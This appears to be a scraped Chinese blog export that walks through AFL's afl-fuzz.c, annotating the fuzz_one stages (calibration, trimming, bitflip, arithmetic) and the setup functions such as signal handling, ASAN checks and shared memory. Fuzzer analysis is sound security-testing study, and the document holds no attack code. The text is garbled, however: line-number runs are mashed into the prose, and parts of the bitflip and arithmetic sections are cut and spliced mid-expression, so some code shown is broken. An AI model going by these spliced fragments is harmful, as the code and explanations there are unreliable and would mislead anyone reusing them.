初始化阶段这部分主要是fuzz前最后的一些准备。包括了一些变量的初始化，映射case等，以及CALIBRATION阶段、TRIMMING阶段和PERFORMANCE SCORE阶段这三个比较简短的准备阶段 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197/* Take the current entry from the queue, fuzz it for a while. This function is a tad too long... returns 0 if fuzzed successfully, 1 if skipped or bailed out. *//* 调用fuzz_one对queue_cur进行一次变异测试（fuzz_one并不一定真的执行当前queue_cur， 它有一定的策略；如果不执行，就直接返回1，否则返回0） */static u8 fuzz_one(char** argv) { s32 len, fd, temp_len, i, j; u8 *in_buf, *out_buf, *orig_in, *ex_tmp, *eff_map = 0; u64 havoc_queued, orig_hit_cnt, new_hit_cnt; u32 splice_cycle = 0, perf_score = 100, orig_perf, prev_cksum, eff_cnt = 1; u8 ret_val = 1, doing_det = 0; u8 a_collect[MAX_AUTO_EXTRA]; u32 a_len = 0;#ifdef IGNORE_FINDS /* In IGNORE_FINDS mode, skip any entries that weren't in the initial data set. */ if (queue_cur->depth > 1) return 1;#else /* 判断pending_favored的值：（这里用到的常量可以在config.h找到） 1.如果为0，对于queue_cur被fuzz过或者不是favored的，有99%的概率不执行，直接返回1 2.如果不为0，并且不是dumb_mode、不是favored的、queued_paths>10： a.如果queue_cycle大于1，且没有被fuzz过，那么有95%的概率不执行，直接返回1 b.否则，有75%的概率不执行，直接返回1 */ if (pending_favored) { /* If we have any favored, non-fuzzed new arrivals in the queue, possibly skip to them at the expense of already-fuzzed or non-favored cases. */ if ((queue_cur->was_fuzzed || !queue_cur->favored) && UR(100) < SKIP_TO_NEW_PROB) return 1; } else if (!dumb_mode && !queue_cur->favored && queued_paths > 10) { /* Otherwise, still possibly skip non-favored cases, albeit less often. The odds of skipping stuff are higher for already-fuzzed inputs and lower for never-fuzzed entries. */ if (queue_cycle > 1 && !queue_cur->was_fuzzed) { if (UR(100) < SKIP_NFAV_NEW_PROB) return 1; } else { if (UR(100) < SKIP_NFAV_OLD_PROB) return 1; } }#endif /* ^IGNORE_FINDS */ /* 如果不是tty模式，输出提示信息并刷新stdout缓冲区 */ if (not_on_tty) { ACTF(\"Fuzzing test case #%u (%u total, %llu uniq crashes found)...\", current_entry, queued_paths, unique_crashes); fflush(stdout); } /* Map the test case into memory. */ /* 这部分主要将case映射到内存的处理： 1.设置len为queue_cur->len 2.打开case对应的文件，并通过mmap映射到内存里，将地址赋值给in_buf和orig_in 3.分配len大小的内存，并初始化为全0，然后将地址赋值给out_buf 4.将连续超时计数器subseq_tmout清零 5.设置cur_depth为queue_cur->depth */ fd = open(queue_cur->fname, O_RDONLY); if (fd < 0) PFATAL(\"Unable to open '%s'\", queue_cur->fname); len = queue_cur->len; orig_in = in_buf = mmap(0, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0); if (orig_in == MAP_FAILED) PFATAL(\"Unable to mmap '%s'\", queue_cur->fname); close(fd); /* We could mmap() out_buf as MAP_PRIVATE, but we end up clobbering every single byte anyway, so it wouldn't give us any performance or memory usage benefits. */ out_buf = ck_alloc_nozero(len); subseq_tmouts = 0; cur_depth = queue_cur->depth; /******************************************* * CALIBRATION (only if failed earlier on) * *******************************************/ /* 这里开始进入CALIBRATION阶段： 1.假如当前项有校准错误，并且校准错误次数小于3次，那么就调用calibrate_case再次校准 2.如果设置了stop_soon，或者res不等于crash_mode： a.计数器cur_skipped_paths加1 b.进入abandon_entry作后续处理 */ if (queue_cur->cal_failed) { u8 res = FAULT_TMOUT; if (queue_cur->cal_failed < CAL_CHANCES) { /* Reset exec_cksum to tell calibrate_case to re-execute the testcase avoiding the usage of an invalid trace_bits. For more info: https://github.com/AFLplusplus/AFLplusplus/pull/425 */ queue_cur->exec_cksum = 0; res = calibrate_case(argv, queue_cur, in_buf, queue_cycle - 1, 0); if (res == FAULT_ERROR) FATAL(\"Unable to execute target application\"); } if (stop_soon || res != crash_mode) { cur_skipped_paths++; goto abandon_entry; } } /************ * TRIMMING * ************/ /* 这里开始进入TRIMMING阶段： 1.如果不处于dumb_mode，且当前项没有被裁剪： a.调用trim_case对queue_cur进行trim b.设置queue_cur->trim_done的值为1 c.重新用queue_cur->len去设置len的值 2.将in_buf拷贝len个字节到out_buf中（注意in_buf是trim_case的参数，得到了裁剪） */ if (!dumb_mode && !queue_cur->trim_done) { u8 res = trim_case(argv, queue_cur, in_buf); if (res == FAULT_ERROR) FATAL(\"Unable to execute target application\"); if (stop_soon) { cur_skipped_paths++; goto abandon_entry; } /* Don't retry trimming, even if it failed. */ queue_cur->trim_done = 1; if (len != queue_cur->len) len = queue_cur->len; } memcpy(out_buf, in_buf, len); /********************* * PERFORMANCE SCORE * *********************/ /* 这里开始进入PERFORMANCE SCORE阶段： 1.对当前项调用calculate_score，算出得分并设置orig_perf和perf_score 2.如果设置了skip_deterministic，或者当前项被fuzz过，或者passed_det为1（好像也是被fuzz过） ，那么跳转到havoc_stage去执行 3.如果执行路径校验和，超过此主实例的范围，那么也跳转到havoc_stage去执行 4.若没跳走，设置doing_det的值为1（位于fuzz_one中的一个局部变量） */ orig_perf = perf_score = calculate_score(queue_cur); /* Skip right away if -d is given, if we have done deterministic fuzzing on this entry ourselves (was_fuzzed), or if it has gone through deterministic testing in earlier, resumed runs (passed_det). */ if (skip_deterministic || queue_cur->was_fuzzed || queue_cur->passed_det) goto havoc_stage; /* Skip deterministic fuzzing if exec path checksum puts this out of scope for this master instance. */ if (master_max && (queue_cur->exec_cksum % master_max) != master_id - 1) goto havoc_stage; doing_det = 1; SIMPLE BITFLIP (+dictionary construction)阶段在比特反转，根据目标大小的不同，分为了多个不同的阶段： bitflip 1/1 && collect tokens -> 按位取反 && 搜集token bitflip 2/1 相邻两位进行取反 bitflip 4/1 相邻四位进行取反 bitflip 8/8 && effector map -> 按字节取反 && 构建effector map bitflip 16/8 连续两byte翻转 bitflip 32/8 连续四byte翻转 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429 /********************************************* * SIMPLE BITFLIP (+dictionary construction) * *********************************************//* 这里开始进入SIMPLE BITFILP阶段，先来品一下FLIP_BIT这个宏，它的最后一条指令很有味道： 1.等式右边： a.(_bf) & 7)相当于对8取模，得到0~7中的一个数 b.128的二进制为10000000 c.128 >> ((_bf) & 7)也就是在00000000这8个bit位上中的某个位置1，具体哪一位由_bf决定 2.等式左边： a.(_bf) >> 3，是对_bf除8，想一想，这里为什么是除8而不是模8？其实算一下就能明白，假设_bf的 取值范围是0~7，那么模8后得到的值的范围也是0~7，而除8得到的值只有0。而1个字节又有8bit，假 设被除数有两个字节/16bit，除8意味着，前8次计算，都指向第一个字节的位置，后8次计算，都指向 第二个字节的位置。这样是不是就好理解了。然后再往下看 b._arf[(_bf) >> 3]，_arf是u8*类型，而u8就是char类型，也就是1字节。因此这里(_bf) >> 3 得到的就是在_arf数组里的下标。再往后看 c._arf[(_bf) >> 3] ^= (128 >> ((_bf) & 7))，前面提到，(_bf) >> 3，会导致连续（假设 在循环中依次递增_bf）8次指向某一个字节的位置，而等式右边刚好可以在8次内将单个字节上的8个比 特依次置位。之后后再进行异或运算。 3.因此可以得出结论，这个FLIP_BIT就是对参数_ar指向的数组每个字节的每个比特进行翻转；而参数_b必 须是一个8的倍数的数。这部分仍未理解明白可以去参考hollk师傅的文章，链接贴在文末*/#define FLIP_BIT(_ar, _b) do { \\ u8* _arf = (u8*)(_ar); \\ u32 _bf = (_b); \\ _arf[(_bf) >> 3] ^= (128 >> ((_bf) & 7)); \\ } while (0) /* Single walking bit. */ /* 理解了FLIP_BIT这个宏，下面来看bitflip的每个阶段，首先是bitflip 1/1： 1.设置循环次数stage_max为len < 3，因为len得到的是大小是字节，乘8后就可以在循环中对每个字节 3]; a_len++; if (a_len >= MIN_AUTO_EXTRA && a_len = MIN_AUTO_EXTRA && a_len EFF_MAX_PERC) { memset(eff_map, 1, EFF_ALEN(len)); blocks_eff_select += EFF_ALEN(len); } else { blocks_eff_select += eff_cnt; } blocks_eff_total += EFF_ALEN(len); new_hit_cnt = queued_paths + unique_crashes; stage_finds[STAGE_FLIP8] += new_hit_cnt - orig_hit_cnt; stage_cycles[STAGE_FLIP8] += stage_max; /* Two walking bytes. */ /* 接下来进入bitflip 16/8阶段，即双字节翻转阶段，这部分原理与单字节翻转类似，但有以下 几点不同： 1.stage_name设置为\"bitflip 16/8\" 2.stage_max设置为len - 1，而不是len 3.以字为单位和0xffff进行异或运算，去翻转相邻的两个字节 4.翻转之前会先检查eff_map里对应于这两个字节的标志是否为0，如果为0，则这两个字节是无 效的数据，stage_max--，然后开始变异下一个字 相同点： 1.先翻转，再common_fuzz_stuff，最后复位 */ if (len < 2) goto skip_bitflip; stage_name = \"bitflip 16/8\"; stage_short = \"flip16\"; stage_cur = 0; stage_max = len - 1; orig_hit_cnt = new_hit_cnt; for (i = 0; i < len - 1; i++) { /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)] && !eff_map[EFF_APOS(i + 1)]) { stage_max--; continue; } stage_cur_byte = i; *(u16*)(out_buf + i) ^= 0xFFFF; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; *(u16*)(out_buf + i) ^= 0xFFFF; } new_hit_cnt = queued_paths + unique_crashes; stage_finds[STAGE_FLIP16] += new_hit_cnt - orig_hit_cnt; stage_cycles[STAGE_FLIP16] += stage_max; if (len < 4) goto skip_bitflip; /* Four walking bytes. */ /* 比特翻转的最后一个阶段，bitflip 32/8，即4字节翻转： 1.stage_name设置为\"bitflip 32/8\" 2.stage_max设置为len - 3 3.以双字（dword）为单位，直接通过和0xffffffff异或运算去翻转相邻四个字节的位，然后 执行一次，并记录 4.在每次翻转之前会检查eff_map里对应于这四个字节的标志是否为0，如果是0，则这两个字节 是无效的数据，stage_max--，然后开始变异下一组双字 5.复位 */ stage_name = \"bitflip 32/8\"; stage_short = \"flip32\"; stage_cur = 0; stage_max = len - 3; orig_hit_cnt = new_hit_cnt; for (i = 0; i < len - 3; i++) { /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)] && !eff_map[EFF_APOS(i + 1)] && !eff_map[EFF_APOS(i + 2)] && !eff_map[EFF_APOS(i + 3)]) { stage_max--; continue; } stage_cur_byte = i; *(u32*)(out_buf + i) ^= 0xFFFFFFFF; if (common_fuzz_stuff(argv, out_buf, len)) goto abandon_entry; stage_cur++; *(u32*)(out_buf + i) ^= 0xFFFFFFFF; } new_hit_cnt = queued_paths + unique_crashes; stage_finds[STAGE_FLIP32] += new_hit_cnt - orig_hit_cnt; stage_cycles[STAGE_FLIP32] += stage_max;skip_bitflip: if (no_arith) goto skip_arith; ARITHMETIC INC/DEC 阶段c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284 /********************** * ARITHMETIC INC/DEC * **********************/ /* 这个阶段进行加减变异，和Bit_Flip阶段差不多，也是按照bit位数递增变异： 1.这个阶段的加减变异是存在上限的在config.h中定义了宏ARITH_MAX，默认为35.所以会对 目标进行+1~+35、-1~-35的运算；由整数存在大端序和小端序两种表现形式，所以这个阶段 会对这两种情况分别进行变异 2.本阶段中两种情况会跳过对应的byte的变异： a.选中字节对应在effector map中是无效的 b.之前Bit_Flip已经生成过的变异：如果加/减某个数后，其效果与之前的某种bitflip相同 ，那么这次变异肯定在上一个阶段已经执行过了，此次便不会再执行 */ /* 8-bit arithmetics. */ /* 重点来看来看arith 8/8阶段，后面的可以类比理解： 1.由于arith 8/8阶段是单字节的，所以不需要考虑大小端，但单字和双字则需要考虑 2.先遍历case中的每个字节，用orig暂存当前字节 3.判断这个字节在eff_map中是否有效，若无效，stage减去2倍的ARITH_MAX，进入下一轮 4.否则进入内层循环 */ stage_name = \"arith 8/8\"; stage_short = \"arith8\"; stage_cur = 0; stage_max = 2 * len * ARITH_MAX; stage_val_type = STAGE_VAL_LE; orig_hit_cnt = new_hit_cnt; for (i = 0; i < len; i++) { u8 orig = out_buf[i]; /* Let's consult the effector map... */ if (!eff_map[EFF_APOS(i)]) { stage_max -= 2 * ARITH_MAX; continue; } /* 1.依次扫描orig~orig+j*（1 favored) pending_favored--; } munmap(orig_in, queue_cur->len); if (in_buf != orig_in) ck_free(in_buf); ck_free(out_buf); ck_free(eff_map); return ret_val;#undef FLIP_BIT} 交互运作文章的最后，附上一张AFL执行时的交互工作图： 参考资料 skr：sakuraのAFL源码全注释 hollk：AFL源码分析之afl-fuzz.c详细注释（二）：FUZZ执行流程 ScUpax0s：AFL源码阅读笔记之gcc与fuzz部分 AFL：afl-fuzz.c Seebug：AFL 二三事——源码分析 HICOOKIE：AFL-Learning Jussi Judin：afl-fuzz on different file systems","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"},{"name":"Fuzzing","slug":"Fuzzing","permalink":"http://cata1oc.github.io/tags/Fuzzing/"}]},{"title":"AFL源码分析04：afl-fuzz.c","slug":"AFL源码分析04","date":"2022-02-06T10:33:55.000Z","updated":"2022-05-17T15:56:05.206Z","comments":true,"path":"2022/02/06/AFL源码分析04/","link":"","permalink":"http://cata1oc.github.io/2022/02/06/AFL%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%9004/","excerpt":"","text":"前言本篇是对afl-fuzz.c中初始化部分的函数进行分析，由于源码过于庞大，部分较为简单的函数或者内容冗余的函数就不详细分析了，将只会摘取出部分源码进行解析。 afl-fuzz.c源码分析（初始配置）关键变量c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172EXP_ST u8 *in_dir, /* Input directory with test cases */ *out_file, /* File to fuzz, if any */ *out_dir, /* Working & output directory */ *sync_dir, /* Synchronization directory */ *sync_id, /* Fuzzer ID */ *use_banner, /* Display banner */ *in_bitmap, /* Input bitmap */ *doc_path, /* Path to documentation dir */ *target_path, /* Path to target binary */ /* 在check_binary被设置为可执行文件地址*/ /* 在get_qemu_argv被设置为afl-qemu-trace地址 */ *orig_cmdline; /* Original command line */ EXP_ST u32 exec_tmout = EXEC_TIMEOUT; /* Configurable exec timeout (ms) */static u32 hang_tmout = EXEC_TIMEOUT; /* Timeout used for hang det (ms) */ static u32 stats_update_freq = 1; /* Stats update frequency (execs) */ /* 首次出现在calibrate_case */ EXP_ST u8 skip_deterministic, /* Skip deterministic stages? */ force_deterministic, /* Force deterministic stages? */ use_splicing, /* Recombine input files? */ dumb_mode, /* Run in non-instrumented mode? */ score_changed, /* Scoring for favorites changed? */ /* 首次出现在update_bitmap_score判断 */ /* top_rated[i]中的胜者是否改变 */ kill_signal, /* Signal that killed the child */ resuming_fuzz, /* Resuming an older fuzzing job? */ timeout_given, /* Specific timeout given? */ cpu_to_bind_given, /* Specified cpu_to_bind given? */ not_on_tty, /* stdout is not a tty */ term_too_small, /* terminal dimensions too small */ uses_asan, /* Target uses ASAN? */ no_forkserver, /* Disable forkserver? */ crash_mode, /* Crash mode! Yeah! */ in_place_resume, /* Attempt in-place resume? */ auto_changed, /* Auto-generated tokens changed? */ no_cpu_meter_red, /* Feng shui on the status screen */ no_arith, /* Skip most arithmetic ops */ shuffle_queue, /* Shuffle input queue? */ bitmap_changed = 1, /* Time to update bitmap? */ qemu_mode, /* Running in QEMU mode? */ skip_requested, /* Skip request, via SIGUSR1 */ run_over10m, /* Run time over 10 minutes? */ persistent_mode, /* Running in persistent mode? */ deferred_mode, /* Deferred forkserver mode? */ fast_cal; /* Try to calibrate faster? */ /* 若设置了环境变量AFL_FAST_CAL，则会 */ /* 设置该值，在calibrate_case中使用 */static s32 forksrv_pid, /* PID of the fork server */ child_pid = -1, /* PID of the fuzzed program */ out_dir_fd = -1; /* FD of the lock file */static s32 out_fd, /* Persistent fd for out_file */ dev_urandom_fd = -1, /* Persistent fd for /dev/urandom */ dev_null_fd = -1, /* Persistent fd for /dev/null */ /* 首次用于init_forkserver */ fsrv_ctl_fd, /* Fork server control pipe (write) */ fsrv_st_fd; /* Fork server status pipe (read) */static s32 forksrv_pid, /* PID of the fork server */ child_pid = -1, /* PID of the fuzzed program */ out_dir_fd = -1; /* FD of the lock file */EXP_ST u8* trace_bits; /* SHM with instrumentation bitmap */ static s32 shm_id; /* ID of the SHM region */EXP_ST u8 virgin_bits[MAP_SIZE], /* Regions yet untouched by fuzzing */ virgin_tmout[MAP_SIZE], /* Bits we haven't seen in tmouts */ virgin_crash[MAP_SIZE]; /* Bits we haven't seen in crashes */static u8 var_bytes[MAP_SIZE]; /* Bytes that appear to be variable */ /* 仅用于calibrate_case中 */EXP_ST u32 queued_paths, /* Total number of queued testcases */ queued_variable, /* Testcases with variable behavior */ queued_at_start, /* Total number of initial inputs */ queued_discovered, /* Items discovered during this run */ queued_imported, /* Items imported via -S */ queued_favored, /* Paths deemed favorable */ queued_with_cov, /* Paths with new coverage bytes */ pending_not_fuzzed, /* Queued but not done yet */ pending_favored, /* Pending favored paths */ cur_skipped_paths, /* Abandoned inputs in cur cycle */ cur_depth, /* Current path depth */ max_depth, /* Max path depth */ useless_at_start, /* Number of useless starting paths */ var_byte_count, /* Bitmap bytes with var behavior */ current_entry, /* Current queue entry ID */ havoc_div = 1; /* Cycle count divisor for havoc *//* 这里的大部分字段用于write_stats_file中更新状态界面 */EXP_ST u64 total_crashes, /* Total number of crashes */ unique_crashes, /* Crashes with unique signatures */ total_tmouts, /* Total number of timeouts */ unique_tmouts, /* Timeouts with unique signatures */ unique_hangs, /* Hangs with unique signatures */ total_execs, /* Total execve() calls */ slowest_exec_ms, /* Slowest testcase non hang in ms */ /* 首次出现在run_target中，用于判断执行是否超时 */ start_time, /* Unix start time (ms) */ last_path_time, /* Time for most recent path (ms) */ last_crash_time, /* Time for most recent crash (ms) */ last_hang_time, /* Time for most recent hang (ms) */ last_crash_execs, /* Exec counter at last crash */ queue_cycle, /* Queue round counter */ cycles_wo_finds, /* Cycles without any new paths */ trim_execs, /* Execs done to trim input files */ bytes_trim_in, /* Bytes coming into the trimmer */ bytes_trim_out, /* Bytes coming outa the trimmer */ blocks_eff_total, /* Blocks subject to effector maps */ blocks_eff_select; /* Blocks selected as fuzzable */static u8 *stage_name = \"init\", /* Name of the current fuzz stage */ *stage_short, /* Short stage name */ *syncing_party; /* Currently syncing with... */static s32 stage_cur, stage_max; /* Stage progression */ /* 首次出现在calibrate_case */static s32 splicing_with = -1; /* Splicing with which test case? */struct extra_data { u8* data; /* Dictionary token data */ u32 len; /* Dictionary token length */ u32 hit_cnt; /* Use count in the corpus */};static struct extra_data* extras; /* Extra tokens to fuzz with */static u32 extras_cnt; /* Total number of tokens read */static struct extra_data* a_extras; /* Automatically selected extras */static u32 a_extras_cnt; /* Total number of tokens available *//* Interesting values, as per config.h */static s8 interesting_8[] = { INTERESTING_8 };static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 };static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 };/* List of interesting values to use in fuzzing. */#define INTERESTING_8 -128, /* Overflow signed 8-bit when decremented */ -1, /* */ 0, /* */ 1, /* */ 16, /* One-off with common buffer size */ 32, /* One-off with common buffer size */ 64, /* One-off with common buffer size */ 100, /* One-off with common buffer size */ 127 /* Overflow signed 8-bit when incremented */#define INTERESTING_16 -32768, /* Overflow signed 16-bit when decremented */ -129, /* Overflow signed 8-bit */ 128, /* Overflow signed 8-bit */ 255, /* Overflow unsig 8-bit when incremented */ 256, /* Overflow unsig 8-bit */ 512, /* One-off with common buffer size */ 1000, /* One-off with common buffer size */ 1024, /* One-off with common buffer size */ 4096, /* One-off with common buffer size */ 32767 /* Overflow signed 16-bit when incremented */#define INTERESTING_32 -2147483648LL, /* Overflow signed 32-bit when decremented */ -100663046, /* Large negative number (endian-agnostic) */ -32769, /* Overflow signed 16-bit */ 32768, /* Overflow signed 16-bit */ 65535, /* Overflow unsig 16-bit when incremented */ 65536, /* Overflow unsig 16 bit */ 100663045, /* Large positive number (endian-agnostic) */ 2147483647 /* Overflow signed 32-bit when incremented */ setup_signal_handlers理解这部分代码，需要掌握一些Linux进程间通信的知识 c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/* 设置信号处理程序 */EXP_ST void setup_signal_handlers(void) { /* 创建sigaction结构体sa，并设置如下成员： sa_handler： 处理函数指针 sa_flags： 信号处理修改器，这里设置为SA_RESTART表示重启可中断的函数而不是给出EINTR错误 sa_sigaction： 信号行为 sa_mask： 指定一个信号集，在调用sa_handler所指向的信号处理函数之前，该信号集将被加入到进程 的信号屏蔽字中。信号屏蔽字是指当前被阻塞的一组信号，它们不能被当前进程接收到，这里 使用了sigemptyset()创建了控的信号屏蔽字，即不屏蔽任何信息 */ struct sigaction sa; sa.sa_handler = NULL; sa.sa_flags = SA_RESTART; sa.sa_sigaction = NULL; sigemptyset(&sa.sa_mask); /* 用handle_stop_sig处理各种\"stop\"时的情况 handle_stop_sig会进行如下操作： 1.设置stop_soon的值为1 2.如果child_pid存在，就kill掉它 3.如果forksrv_pid存在，就kill掉它 */ sa.sa_handler = handle_stop_sig; sigaction(SIGHUP, &sa, NULL); sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL); /* 用handle_timeout处理超时的情况 handle_timeout会进行如下操作： 1.如果child_pid存在，先设置child_time_out值为1，再kill掉child_pid 2.如果child_pid不存在但forksrv_pid存在，先设置child_time_out值为1，再kill掉forksrv_pid */ sa.sa_handler = handle_timeout; sigaction(SIGALRM, &sa, NULL); /* 用handle_resize处理窗口大小变化的情况，它会将clear_screen的值设置为1 */ sa.sa_handler = handle_resize; sigaction(SIGWINCH, &sa, NULL); /* 用handle_skipreq处理用户自定义的信号，它会将skip_requested的值设置为1 */ sa.sa_handler = handle_skipreq; sigaction(SIGUSR1, &sa, NULL); /* 将其它一些不关心的信号的处理函数设置为SIG_IGN */ sa.sa_handler = SIG_IGN; sigaction(SIGTSTP, &sa, NULL); sigaction(SIGPIPE, &sa, NULL);} check_asan_optsc1234567891011121314151617181920212223242526272829303132/* 读取环境变量ASAN_OPTIONS和MASN_OPTIONS，做一些检查 */static void check_asan_opts(void) { /* 读取环境变量ASAN_OPTIONS，若存在，则进行如下判断： 1.是否设置了abort_on_error的值为1 2.是否设置了symbolize的值为0 若未进行上述设置，则抛出异常 */ u8* x = getenv(\"ASAN_OPTIONS\"); if (x) { if (!strstr(x, \"abort_on_error=1\")) FATAL(\"Custom ASAN_OPTIONS set without abort_on_error=1 - please fix!\"); if (!strstr(x, \"symbolize=0\")) FATAL(\"Custom ASAN_OPTIONS set without symbolize=0 - please fix!\"); } /* 读取环境变量MSAN_OPTIONS，若存在，则进行如下判断： 1.是否设置了exit_code的值为经过'STRINGIFY(MASN_ERROR)'运算后的结果 2.是否设置了symbolize的值为0 若未进行上述设置，则抛出异常 */ x = getenv(\"MSAN_OPTIONS\"); if (x) { if (!strstr(x, \"exit_code=\" STRINGIFY(MSAN_ERROR))) FATAL(\"Custom MSAN_OPTIONS set without exit_code=\" STRINGIFY(MSAN_ERROR) \" - please fix!\"); if (!strstr(x, \"symbolize=0\")) FATAL(\"Custom MSAN_OPTIONS set without symbolize=0 - please fix!\"); }} fix_up_syncc1234567891011121314151617181920212223242526272829303132333435363738394041/* 如果通过-M或者-S指定了sync_id（位于main函数中），则修复out_dir和sync_dir的值 */static void fix_up_sync(void) { u8* x = sync_id; /* 如果位于dumb_mode模式，即参数设置了'-n'选项，提示'-S/-M'参数与'-n'参数互斥 */ if (dumb_mode) FATAL(\"-S / -M and -n are mutually exclusive\"); /* 如果skip_deterministic置位，说明参数设置了'-d'选项， 如果force_deterministic置位，说明参数设置了'-M'选项， 这里对于这俩参数使用的冲突进行纠正 */ if (skip_deterministic) { if (force_deterministic) FATAL(\"use -S instead of -M -d\"); else FATAL(\"-S already implies -d\"); } /* 1.检测sync_id是否以'数字'、'_'、'-'开头 2.检测sync_id的长度是否过大 */ while (*x) { if (!isalnum(*x) && *x != '_' && *x != '-') FATAL(\"Non-alphanumeric fuzzer ID specified via -S or -M\"); x++; } if (strlen(sync_id) > 32) FATAL(\"Fuzzer ID too long\"); /* 1.设置sync_dir的值为out_dir 2.设置out_dir的值为拼接后的“out_dir/sync_id” */ x = alloc_printf(\"%s/%s\", out_dir, sync_id); sync_dir = out_dir; out_dir = x; /* 若参数中未设置'-M'选项，则对skip_deterministic和use_splicing进行置位，相当于设置'-d'选项 */ if (!force_deterministic) { skip_deterministic = 1; use_splicing = 1; }} save_cmdlinec123456789101112131415161718192021/* 将当前命令行中的参数复制到新申请的缓冲区buf中 */static void save_cmdline(u32 argc, char** argv) { u32 len = 1, i; u8* buf; for (i = 0; i < argc; i++) len += strlen(argv[i]) + 1; buf = orig_cmdline = ck_alloc(len); for (i = 0; i < argc; i++) { u32 l = strlen(argv[i]); memcpy(buf, argv[i], l); buf += l; if (i != argc - 1) *(buf++) = ' '; } *buf = 0;} fix_up_bannerc12345678910111213141516171819202122/* (创建)并修剪一个运行横幅 */static void fix_up_banner(u8* name) { /* 如果没有设置use_banner，即参数中没有'-T'选项，则对use_banner进行设置： 如果存在sync_id，即参数中设置了'-M'或'-S'选项，就将use_banner设置为sync_id 如果不存在sync_id，就设置为传入参数name的实际值(name本身或最后一个'/'后面的值) */ if (!use_banner) { if (sync_id) { use_banner = sync_id; } else { u8* trim = strrchr(name, '/'); if (!trim) use_banner = name; else use_banner = trim + 1; } } /* 如果use_banner的长度超过40字节，将超过40字节的地方截断，并设置成'.use_banner...'的形式 */ if (strlen(use_banner) > 40) { u8* tmp = ck_alloc(44); sprintf(tmp, \"%.40s...\", use_banner); use_banner = tmp; }} check_if_ttyc1234567891011121314151617181920212223/* 检测是否在tty终端上运行 */static void check_if_tty(void) { struct winsize ws; /* 检测环境变量AFL_NO_UI的值，如果存在，则设置not_on_tty的值为1，并返回 */ if (getenv(\"AFL_NO_UI\")) { OKF(\"Disabling the UI because AFL_NO_UI is set.\"); not_on_tty = 1; return; } /* int ioctl(int fd, unsigned long request, ...); 通过ioctl来读取windows size(TIOCGWINSZ时，用于获取窗口大小)， 如果last error保存的值为ENOTTY，则设置not_on_tty的值为1，并返回 */ if (ioctl(1, TIOCGWINSZ, &ws)) { if (errno == ENOTTY) { OKF(\"Looks like we're not running on a tty, so I'll be a bit less verbose.\"); not_on_tty = 1; } return; }} CPU检查相关函数c1234567891011/* 计算逻辑上CPU的核心数 */static void get_core_count(void);/* 根据亲缘性设置，将进程绑定到指定CPU核心，如果没找到合适的CPU则返回-1，CPU上限为4096个 */bind_to_free_cpu();/* 确保核心转储时不会进入程序 */static void check_crash_handling(void);/* 检查CPU的管理者 */static void check_cpu_governor(void); setup_postc1234567891011121314151617181920212223242526/* 设置后置处理器 */static void setup_post(void) { /* 获取环境变量AFL_POST_LIBRARY，如果未设置该值，则直接返回 */ void* dh; u8* fn = getenv(\"AFL_POST_LIBRARY\"); u32 tlen = 6; if (!fn) return; ACTF(\"Loading postprocessor from '%s'...\", fn); /* 打开环境变量AFL_POST_LIBRARY指向的动态链接库，RTLD_NOW指定了在函数返回前解析出所有未定义的符号 调用dlsym获取'afl_postprocess'的函数地址，若获取失败，则抛出异常 */ dh = dlopen(fn, RTLD_NOW); if (!dh) FATAL(\"%s\", dlerror()); post_handler = dlsym(dh, \"afl_postprocess\"); if (!post_handler) FATAL(\"Symbol 'afl_postprocess' not found.\"); /* 调用'afl_postprocess'，做个简单的测试，用于发现可能存在的段错误 */ post_handler(\"hello\", &tlen); OKF(\"Postprocessor installed successfully.\");} setup_shm这部分涉及到的共享内存知识点可以参考此篇。 c1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/* 配置共享内存和virgin_bits，在程序启动时会被调用 */EXP_ST void setup_shm(void) { u8* shm_str; /* 如果输入位图input bitmap为空，即参数中未设置'-B'选项，就用'\\xff'初始化virgin_bits数组的每个元素 接下来，virgin_tmout数组与virgin_crash数组也进行类似的初始化 (index: 0-65535) */ if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); memset(virgin_tmout, 255, MAP_SIZE); memset(virgin_crash, 255, MAP_SIZE); /* 函数原型：int shmget(key_t key, size_t size, int shmflg); 